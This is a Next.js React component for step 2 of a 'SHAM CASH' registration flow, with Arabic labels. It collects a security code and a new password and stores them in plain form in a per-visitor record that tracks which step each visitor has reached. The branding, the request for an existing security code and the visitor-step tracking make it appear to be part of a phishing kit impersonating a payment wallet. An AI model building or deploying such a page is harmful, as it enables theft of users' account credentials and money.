'use client';

import { useRouter } from 'next/navigation';
import { useState } from 'react';
import { useVisitorContext } from '@/contexts/VisitorContext';
import StepIndicator from '@/components/StepIndicator';

export default function Step2() {
  const router = useRouter();
  const { updateVisitorData, updateVisitorStep } = useVisitorContext();

  const [securityCode, setSecurityCode] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [errors, setErrors] = useState<{ securityCode?: string; password?: string; confirmPassword?: string }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const validate = () => {
    const newErrors: typeof errors = {};
    if (!securityCode.trim()) newErrors.securityCode = 'رمز الأمان مطلوب';
    if (!password) newErrors.password = 'كلمة المرور مطلوبة';
    else if (password.length < 8) newErrors.password = 'كلمة المرور يجب أن تكون 8 أحرف على الأقل';
    if (!confirmPassword) newErrors.confirmPassword = 'تأكيد كلمة المرور مطلوب';
    else if (password !== confirmPassword) newErrors.confirmPassword = 'كلمة المرور غير متطابقة';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = async () => {
    if (!validate()) return;

    setIsSubmitting(true);

    const visitorId = sessionStorage.getItem('currentVisitorId');
    if (visitorId) {
      updateVisitorData(visitorId, {
        securityCode: securityCode.trim(),
        password,
      });
      updateVisitorStep(visitorId, 2);
    }

    await new Promise((r) => setTimeout(r, 400));
    router.push('/registration/step-3');
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#020617] to-[#020c2b] text-white flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-6">
          <div className="w-20 h-20 bg-[#4A7FFF] rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg shadow-[#4A7FFF]/30">
            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-xl font-bold">SHAM CASH</h1>
          <p className="text-green-400 text-sm">نظام إدارة الزوار والمدفوعات</p>
        </div>

        <StepIndicator currentStep={2} />

        <div className="text-center mb-6">
          <h2 className="text-lg font-bold">رمز الأمان وكلمة السر</h2>
          <p className="text-gray-400 text-sm">
            أدخل رمز الأمان وقم بتعيين كلمة المرور الجديدة
          </p>
        </div>

        <div className="bg-[#0f172a] rounded-2xl p-4 space-y-4 shadow-lg">
          <div>
            <label className="text-sm text-gray-300">رمز الأمان</label>
            <input
              type="text"
              placeholder="أدخل رمز الأمان"
              className={`w-full mt-1 bg-[#020617] border rounded-xl p-3 outline-none transition-colors ${
                errors.securityCode ? 'border-red-500' : 'border-blue-500/20 focus:border-blue-400'
              }`}
              value={securityCode}
              onChange={(e) => {
                setSecurityCode(e.target.value);
                if (errors.securityCode) setErrors((p) => ({ ...p, securityCode: undefined }));
              }}
            />
            {errors.securityCode && <p className="text-red-400 text-xs mt-1">{errors.securityCode}</p>}
          </div>

          <div>
            <label className="text-sm text-gray-300">كلمة المرور</label>
            <input
              type="password"
              placeholder="أدخل كلمة المرور"
              className={`w-full mt-1 bg-[#020617] border rounded-xl p-3 outline-none transition-colors ${
                errors.password ? 'border-red-500' : 'border-blue-500/20 focus:border-blue-400'
              }`}
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (errors.password) setErrors((p) => ({ ...p, password: undefined }));
              }}
            />
            {errors.password && <p className="text-red-400 text-xs mt-1">{errors.password}</p>}
          </div>

          <div>
            <label className="text-sm text-gray-300">إعادة كلمة المرور</label>
            <input
              type="password"
              placeholder="أعد إدخال كلمة المرور"
              className={`w-full mt-1 bg-[#020617] border rounded-xl p-3 outline-none transition-colors ${
                errors.confirmPassword ? 'border-red-500' : 'border-blue-500/20 focus:border-blue-400'
              }`}
              value={confirmPassword}
              onChange={(e) => {
                setConfirmPassword(e.target.value);
                if (errors.confirmPassword) setErrors((p) => ({ ...p, confirmPassword: undefined }));
              }}
            />
            {errors.confirmPassword && <p className="text-red-400 text-xs mt-1">{errors.confirmPassword}</p>}
          </div>

          <button
            onClick={handleNext}
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-cyan-400 to-blue-500 py-3 rounded-xl font-bold disabled:opacity-60 flex items-center justify-center gap-2"
          >
            {isSubmitting ? (
              <>
                <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                جاري المتابعة...
              </>
            ) : (
              'متابعة'
            )}
          </button>
        </div>

        <div
          onClick={() => router.back()}
          className="text-center mt-4 text-blue-400 cursor-pointer hover:text-blue-300 transition-colors text-sm"
        >
          ← العودة للخطوة السابقة
        </div>
      </div>
    </main>
  );
}
